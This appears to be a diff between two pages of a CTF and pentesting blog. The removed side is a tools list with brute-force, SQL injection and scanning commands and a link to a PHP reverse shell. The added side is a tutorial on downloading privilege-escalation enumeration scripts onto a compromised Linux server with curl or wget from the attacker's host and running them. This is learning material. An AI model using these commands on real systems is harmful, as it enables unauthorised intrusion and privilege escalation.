@@ -10,26 +10,27 @@
     <meta name="generator" content="Hugo">
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pentesting tools | theyknow</title>
-    <meta name="description" content="This page will be a completely chaotic list of tools, articles, and ressources I use regularly in Pentesting and CTF situations. My goal is to update this list as often as possible with examples, articles, and useful tips. It will serve as a reference for myself when I forget things and hopefully help other to discover tools that they haven&rsquo;t used. If you know of more tools or find a mistake, please contact me on Twitter or by email (links above).">
-    <meta name="keywords" content="enumaration, bruteforce, pentest, ctf, crypto, web, forensic, privesc, linux, windows">
+    <title>Upload enumeration tools to a linux server | theyknow</title>
+    <meta name="description" content="One of the first things I was asking myself when finally getting access to a linux server at my very beginning was &#39;How do I even upload the enumeration tools to do the privilege escalation?&#39;. I got the question from someone who was beginning on HTB recently so this short article might help.">
+    <meta name="keywords" content="enumeration, ctf, privesc, linenum, pspy">
     
     
     
     
-    <meta property="og:title" content="Pentesting tools" />
-<meta property="og:description" content="This page will be a completely chaotic list of tools, articles, and ressources I use regularly in Pentesting and CTF situations. My goal is to update this list as often as possible with examples, articles, and useful tips. It will serve as a reference for myself when I forget things and hopefully help other to discover tools that they haven&rsquo;t used. If you know of more tools or find a mistake, please contact me on Twitter or by email (links above)." />
+    <meta property="og:title" content="Upload enumeration tools to a linux server" />
+<meta property="og:description" content="One of the first things I was asking myself when finally getting access to a linux server at my very beginning was &#39;How do I even upload the enumeration tools to do the privilege escalation?&#39;. I got the question from someone who was beginning on HTB recently so this short article might help." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://domain.example/tools/pentest/" />
+<meta property="og:url" content="https://domain.example/post/upload-tools/" />
 
-<meta property="og:image" content="http://3.bp.blogspot.com/-vGEwwWY0yKU/T1YLYpBkZDI/AAAAAAAAAY8/aKJAvITV2kc/s1600/wpscan.png" />
-
+<meta property="og:image" content="https://i.imgur.com/t7YRxYU.png" />
+<meta property="article:published_time" content="2019-07-21T01:00:00&#43;02:00"/>
+<meta property="article:modified_time" content="2019-07-21T01:00:00&#43;02:00"/>
 
     <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="http://3.bp.blogspot.com/-vGEwwWY0yKU/T1YLYpBkZDI/AAAAAAAAAY8/aKJAvITV2kc/s1600/wpscan.png"/>
+<meta name="twitter:image" content="https://i.imgur.com/t7YRxYU.png"/>
 
-<meta name="twitter:title" content="Pentesting tools"/>
-<meta name="twitter:description" content="This page will be a completely chaotic list of tools, articles, and ressources I use regularly in Pentesting and CTF situations. My goal is to update this list as often as possible with examples, articles, and useful tips. It will serve as a reference for myself when I forget things and hopefully help other to discover tools that they haven&rsquo;t used. If you know of more tools or find a mistake, please contact me on Twitter or by email (links above)."/>
+<meta name="twitter:title" content="Upload enumeration tools to a linux server"/>
+<meta name="twitter:description" content="One of the first things I was asking myself when finally getting access to a linux server at my very beginning was &#39;How do I even upload the enumeration tools to do the privilege escalation?&#39;. I got the question from someone who was beginning on HTB recently so this short article might help."/>
 
     
 
@@ -88,7 +89,7 @@ fetchInject(["/js/lazysizes.min.js"]);
 
 
     
-    <link rel="canonical" href="https://domain.example/tools/pentest/">
+    <link rel="canonical" href="https://domain.example/post/upload-tools/">
     
     
     <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
@@ -195,12 +196,12 @@ a[itemprop="url"]:hover {
     
       
       
-        <a itemprop="url" href="/post">Posts</a>
+        <a itemprop="url" class="active" href="/post">Posts</a>
       
     
       
       
-        <a itemprop="url" class="active" href="/tools">Tools</a>
+        <a itemprop="url" href="/tools">Tools</a>
       
     
       
@@ -227,279 +228,66 @@ a[itemprop="url"]:hover {
 
 </header>
     <main>
-  <header>
-    <h1>Pentesting tools</h1>
-  </header>
-  <p>This page will be a completely chaotic list of tools, articles, and ressources I use regularly in Pentesting and CTF situations. My goal is to update this list as often as possible with examples, articles, and useful tips. It will serve as a reference for myself when I forget things and hopefully help other to discover tools that they haven&rsquo;t used. If you know of more tools or find a mistake, please contact me on Twitter or by email (links above).</p>
-
-<p>(last edited: 21/07/2019)</p>
-
-<p>Pinned on /r/hacking (even more tools suggested there):
-<a href="https://www.reddit.com/r/hacking/comments/cej67i/a_completely_chaotic_list_of_tools_articles_and/"><img src="/feature.png" alt="Reddit screenshot" /></a></p>
-
-<p><a href="https://tools.kali.org/password-attacks/hydra">Hydra</a><br>
+  <article itemscope itemtype="https://schema.org/BlogPosting">
+    
+<meta itemprop="name" content="Upload enumeration tools to a linux server">
+<meta itemprop="description" content="One of the first things I was asking myself when finally getting access to a linux server at my very beginning was &#39;How do I even upload the enumeration tools to do the privilege escalation?&#39;. I got the question from someone who was beginning on HTB recently so this short article might help.">
 
 
+<meta itemprop="datePublished" content="2019-07-21T01:00:00&#43;02:00" />
+<meta itemprop="dateModified" content="2019-07-21T01:00:00&#43;02:00" />
+<meta itemprop="wordCount" content="540">
 
-
-<div class="alert alert-info">
-  
-hydra options $user/$passOptions $ip/$url serviceOptions<br>
-Example I used during a CTF to find valid usernames:<br><br>
-hydra -L usernames.txt -p password -f -s 5001 35.227.x.x http-post-form "/hash/login:username=^USER^&password=^PASS^:Invalid username"
--t 64
-
-</div>
-
-</p>
-
-<p><a href="https://www.openwall.com/john/">John the Ripper</a>
+  <meta itemprop="image" content="https://i.imgur.com/t7YRxYU.png">
 
 
 
+<meta itemprop="keywords" content="enumeration,ctf,privesc,linenum,pspy," />
 
-<div class="alert alert-info">
-  
-Another bruteforcing tool, for password hashes this time. I explain how to add a new rule in <a href="/post/i18-1">this post</a>. <br><br>
-john --wordlist=password.lst --rules mypasswd
+    <header>
+      <h1 itemprop="headline name">Upload enumeration tools to a linux server</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>3 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
 
-</div>
-
-</p>
-
-<p><a href="https://hashcat.net/hashcat/">hashcat</a>
-
-
-
-
-<div class="alert alert-info">
-  
-hashcat is the world's fastest and most advanced password recovery utility, supporting five unique modes of attack for over 200 highly-optimized hashing algorithms. hashcat currently supports CPUs, GPUs, and other hardware accelerators on Linux, Windows, and macOS, and has facilities to help enable distributed password cracking.<br><br>
-Important note: a VM won't have access to your hardware so you'll need to do modifications to make it work as it will try to use GPU.
-
-</div>
-
-</p>
-
-<p><a href="http://sqlmap.org/">SQLMap</a>
+  Published: <time datetime="2019-07-21T01:00:00&#43;02:00">21 Jul, 2019</time>
 
 
+      </p>
+      
+        <blockquote itemprop="description">One of the first things I was asking myself when finally getting access to a linux server at my very beginning was &#39;How do I even upload the enumeration tools to do the privilege escalation?&#39;. I got the question from someone who was beginning on HTB recently so this short article might help.</blockquote>
+      
+      
+    </header>
+    
 
+    <div itemprop="articleBody">
+      
 
-<div class="alert alert-info">
-  
-I use this tool a lot for SQL injections. For more information, check <a href="https://www.binarytides.com/sqlmap-hacking-tutorial/">this tutorial</a>. <br><br>
-sqlmap -u $url options <br><br>
-Very useful option:<br>
---forms: Parse and test forms <br>
+<h2 id="privilege-escalation-privesc">Privilege Escalation (privesc)</h2>
 
-</div>
+<p>When getting access to a server, either during a CTF or a pentesting assignment, you will probably have a limited access to the server itself. Probably because you accessed it through a compromised user. Your goal is to find a way to become root which would give you unlimited access to the server and the running programs. See, developers and sysadmins can make mistakes and have the programs running with the wrong settings. Leveraging these mistakes can give you the keys to root.</p>
 
-</p>
-
-<p><a href="https://wpscan.org/">WPScan</a>
-
-
-
-
-<div class="alert alert-info">
-  
-WPScan is a free, for non-commercial use, black box WordPress vulnerability scanner written for security professionals and blog maintainers to test the security of their sites.<br><br>
-wpscan --url myblog.com<br><br>
-If a more stealthy approach is required, then <br>
-wpscan --stealthy --url myblog.com can be used.<br><br>
-When using the --enumerate option, don't forget to set the --plugins-detection accordingly, as its default is 'passive'.
-
-</div>
-
-</p>
-
-<p><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">Pentestmonkey Reverse Shell</a>
-
-
-
-
-<div class="alert alert-info">
-  
-The PHP reverse shell I use the most, you'll find it on <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">this page</a> with a tutorial on how to use it. Explore the rest of the Pentestmonkey website, it's great.
-
-</div>
-
-</p>
-
-<p><a href="https://github.com/danielmiessler/SecLists">SecLists</a>
-
-
-
-
-<div class="alert alert-info">
-  
-SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.
-
-</div>
-
-</p>
-
-<p><a href="https://nmap.org/">NMAP</a>
-
-
-
-
-<div class="alert alert-info">
-  
-No need to introduce this extremely useful tool, but here my usual command if it interests you:<br>
-nmap -sV -sC -oN myscan.txt $ip <br>
-
+<p>Here are two extensive guides about privesc for Windows and Linux:
 <ul>
-<li>-sV: Version/Service info</li>
-<li>-sC: Run default scripts</li>
-<li>-oN: Normal output</li>
-</ul>
+<li><a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">Windows privesc guide</a></li>
+<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"> Linux privesc guide</a></li>
+</ul></p>
 
-Or the shorter version which combines sV and sC:<br>
-nmap -A -oN myscan.txt $ip<br><br>
+<p>You&rsquo;ll notice in these guides that, to find the mistakes that will get us root, it&rsquo;s all about enumerating the server permissions, the programs running, the cron jobs, etc. And we have tools to do that for us!</p>
 
-And if you do not need to be discreet (for certain CTFs without firewall f.ex.), you can add T5 which is the insane mode. T0 being the paranoid mode and will be a very slow scan.<br>
-nmap -A -T5 -oN myscan.txt $ip<br><br>
+<p>I have a very limited experience in Windows privesc so I will explain how to upload enumeration tools to Linux servers only in this post.
+<br><br></p>
 
-Useful one-liner to look all the scripts that nmap can provide:<br>
-locate -r '\.nse$' | xargs grep categories | grep 'default\|version'<br><br>
+<h2 id="the-tools">The tools</h2>
 
-Let's say you're looking for SMB scripts:<br>
-locate -r '\.nse$' | xargs grep categories | grep 'default\|version' | grep smb
-
-
-
-
-</div>
-
-</p>
-
-<p><a href="https://tools.kali.org/web-applications/wfuzz">Wfuzz</a>
-
-
-
-
-<div class="alert alert-info">
-  
-Extremely useful for enumeration, Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing, etc.<br><br>
-wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.202/FUZZ
-
-</div>
-
-</p>
-
-<p><a href="https://tools.kali.org/web-applications/dirb">Dirb</a>
-
-
-
-
-<div class="alert alert-info">
-  
-Another enumeration tool I use a lot.<br><br>
-dirb http://$ip/ /usr/share/wordlists/dirb/common.txt
-
-</div>
-
-</p>
-
-<p><a href="https://tools.kali.org/web-applications/dirbuster">DirBuster</a>
-
-
-
-
-<div class="alert alert-info">
-  
-Never enough enumeration tools! One more. This one as a GUI, so just type the command 'dirbuster' and it will launch the program.
-
-</div>
-
-</p>
-
-<p><a href="https://cirt.net/nikto2">Nikto</a>
-
-
-
-
-<div class="alert alert-info">
-  
-Did I say enumeration again? Nikto is the last enumeration tool I use. Never underestimate an effective enumeration during the recon phase.<br><br>
-nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host $ip
-
-</div>
-
-</p>
-
-<p><a href="https://tools.kali.org/web-applications/gobuster">Gobuster</a>
-
-
-
-
-<div class="alert alert-info">
-  
-I know, I know: more enumeration. But trust me having different tools to enumerate directories often helped me during CTFs in the recon phase. Just choose the ones that will do the job.<br><br>
-gobuster -e -u $ip -w $wordlist
-
-</div>
-
-</p>
-
-<p><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>
-
-
-
-
-<div class="alert alert-info">
-  
-Sublist3r is a python tool designed to enumerate subdomains of websites using OSINT. Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu, and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS.<br><br>
-python sublist3r.py -d example.com
-
-</div>
-
-</p>
-
-<p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">The Awesome Red Teaming</a>
-
-
-
-
-<div class="alert alert-info">
-  
-List of Awesome Red Team / Red Teaming Resources. This list is for anyone wishing to learn about Red Teaming but do not have a starting point.
-
-</div>
-
-</p>
-
-<p><a href="https://github.com/j3ssie/Osmedeus">Osmedeus</a>
-
-
-
-
-<div class="alert alert-info">
-  
-Osmedeus allows you automated run the collection of awesome tools to reconnaissance and vulnerability scanning against the target. Even has a slack bot to send notifications!<br>
-<p style="text-align:center;"><img src="https://raw.githubusercontent.com/j3ssie/Osmedeus/master/imgs/Osmedeus-architecture.png" width=400px></p>
-./osmedeus.py -t example.com
-
-</div>
-
-</p>
-
-<p><a href="https://xsshunter.com/features">XSS Hunter</a>
-
-
-
-
-<div class="alert alert-info">
-  
-XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.<br>
-<p style="text-align:center;"><img src="https://xsshunter.com/static/img/manage_all_your_injections.png" width=600px></p>
-Upon signing up you will create a special xss.ht short domain such as yoursubdomain.xss.ht which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing and XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.
-
-</div>
-
-</p>
+<p>From my <a href="/tools/pentest">Tools list</a>, you&rsquo;ll find these two very useful enumeration tools:</p>
 
 <p><a href="https://github.com/DominicBreuker/pspy">pspy</a>
 
@@ -508,9 +296,7 @@ Upon signing up you will create a special xss.ht short domain such as yoursubdom
 
 <div class="alert alert-info">
   
-pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.<br><br>
-
-I explain <a href="/post/upload-tools">in this post</a> how to upload enumeration tools to a server.
+pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.
 
 </div>
 
@@ -523,113 +309,126 @@ I explain <a href="/post/upload-tools">in this post</a> how to upload enumeratio
 
 <div class="alert alert-info">
   
-Scripted Local Linux Enumeration & Privilege Escalation Checks.<br><br>
-
-I explain <a href="/post/upload-tools">in this post</a> how to upload enumeration tools to a server.
+Scripted Local Linux Enumeration & Privilege Escalation Checks.
 
 </div>
 
-</p>
 
-<p><a href="https://gtfobins.github.io/">GTFOBins</a>
+<br></p>
+
+<h2 id="the-command-lines">The command lines</h2>
+
+<p>So now that we have the tools on our computer, how to get them to the compromised server?</p>
+
+<p>Quite simple: we will use a python module called SimpleHTTPServer. It is normally used like other modules in python programs, but the SimpleHTTPServer module can also be invoked directly using the -m switch of the interpreter with a port number argument. This serves the files relative to the current directory.</p>
+
 
 
 
 
 <div class="alert alert-info">
   
-GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
+python -m SimpleHTTPServer 80
 
 </div>
 
-</p>
 
-<p><a href="https://lolbas-project.github.io/#">LOLBAS</a>
+
+<p>Now anyone with your IP address and this port number can access this directory and its files through HTTP request, including the compromised server!</p>
+
+<p>So we launch the SimpleHTTPServer from the directory where we have our LinEnum and pspy programs. And from the compromised linux server, we write:
 
 
 
 
 <div class="alert alert-info">
   
-The goal of the LOLBAS project is to document every binary, script, and library that can be used for <a href="https://www.youtube.com/watch?v=j-r6UonEkUw">Living Off The Land techniques</a>.
+curl $yourIP/linenum.sh
 
 </div>
 
 </p>
 
-<p><a href="https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report">TCM Security Sample Pentest Report</a>
+<p>cURL is a command-line tool for getting or sending data including files using URL syntax. Now your downloaded program won&rsquo;t have the permission to run so to make it executable, write:
 
 
 
 
 <div class="alert alert-info">
   
-This is a template for a pentest report kindly given by <a href="https://www.youtube.com/channel/UC0ArlFuFYMpEewyRBzdLHiw">the Cyber Mentor</a> (subscribe to his channel, awesome content), and in his own words: <br><br>
-"I am frequently asked what an actual pentest report looks like. I am providing a barebones demo report for "demo company" that consisted of an external penetration test. The report only includes one finding and is meant to be a starter template for others to use. Please feel free to download and make this your own."
+chmod +x linenum.sh
 
 </div>
 
 </p>
 
-<p><a href="https://gchq.github.io/CyberChef/">Cyber Chef</a>
+<p>And now to execute it, write &ldquo;./linenum.sh&rdquo; in the server directory where the downloaded linenum program is.</p>
+
+<p>Sometimes, curl will not be authorized to be used by the user you compromised, but you can use wget in this case. Let&rsquo;s use pspy this time as an example:
 
 
 
 
 <div class="alert alert-info">
   
-<p style="text-align:center;"><img src="https://gchq.github.io/CyberChef/images/cyberchef-128x128.png" width=100px></p>
-A simple, intuitive web app for analysing and decoding data without having to deal with complex tools or programming languages. CyberChef encourages both technical and non-technical people to explore data formats, encryption and compression.<br><br>
-
-Extremely usefull to quickly decrypt simple hashes. Highly recommend. 
+wget $yourIP/pspy64
 
 </div>
 
 </p>
 
-<p><a href="https://sno.phy.queensu.ca/~phil/exiftool/">exiftool</a>
+<p>Same thing now, we do &ldquo;chmod +x pspy64&rdquo; and then &ldquo;./pspy64&rdquo;, and it will run!</p>
 
+<p><img src="https://raw.githubusercontent.com/DominicBreuker/pspy/master/images/demo.gif"></p>
 
+<p>I hope this was a useful article! There are probably other ways to upload files to a server such as using <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>, but I found the commands in this post to be the simplest for me. And of course I took the example of enumeration tools, but you can use it to upload many more useful tools you would need for your privesc!</p>
 
+<p>Have fun uploading files now!</p>
 
-<div class="alert alert-info">
+    </div>
+    <footer>
+      <hr>
+      <p>
+  Published
   
-ExifTool is a platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a <a href="https://sno.phy.queensu.ca/~phil/exiftool/#supported">wide variety of files</a>. <br><br>
-
-For example, I explain how I extracted hidden information in images in <a href="/post/i18-1">this post</a>.
-
-</div>
-
-</p>
-
-<p><a href="https://www.wireshark.org/">Wireshark</a>
-
-
-
-
-<div class="alert alert-info">
+    
+      by <span itemprop="author">theyknow</span>
+    
   
-Wireshark is the world’s foremost and widely-used network protocol analyzer. It lets you see what’s happening on your network at a microscopic level and is the standard. <br><br>
-
-In many forensic CTF challenges, you might have a pcap (Packet Capture Data) to analyze and Wireshark is more than often the best tool to do that. I used it briefly in <a href="/post/i18-1">this post</a>.
-
-</div>
-
-</p>
-
-<p><a href="https://inventory.rawsec.ml/tools.html">Rawsec&rsquo;s CyberSecurity Inventory</a>
-
-
-
-
-<div class="alert alert-info">
+  <time itemprop="datePublished" datetime="2019-07-21T01:00:00&#43;02:00">
+    21 Jul, 2019
+  </time>
   
-A much bigger inventory of tools and resources about CyberSecurity than mine here. Highly recommend if you want to scroll around and look at all the awesome tools that we have to play with.
-
-</div>
-
+    in <span itemprop="articleSection"><a href="/categories/post/">post</a></span>
+  
+  
+    and tagged <a rel="tag" href="/tags/ctf/">ctf</a>, <a rel="tag" href="/tags/enumeration/">enumeration</a>, <a rel="tag" href="/tags/linenum/">linenum</a>, <a rel="tag" href="/tags/privesc/">privesc</a> and <a rel="tag" href="/tags/pspy/">pspy</a>
+  
+  using <span itemprop="wordCount">540</span> words.
 </p>
 
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/tools/pentest/">Pentesting tools</a>
+        <time datetime="7M">7 minutes</time>
+      
+        <li><a href="/post/i18-2/">i18 Challenge - Part 2</a>
+        <time datetime="4M">4 minutes</time>
+      
+        <li><a href="/post/i18-1/">i18 Challenge - Part 1</a>
+        <time datetime="5M">5 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
 </main>
     <footer>
   <small class="muted">
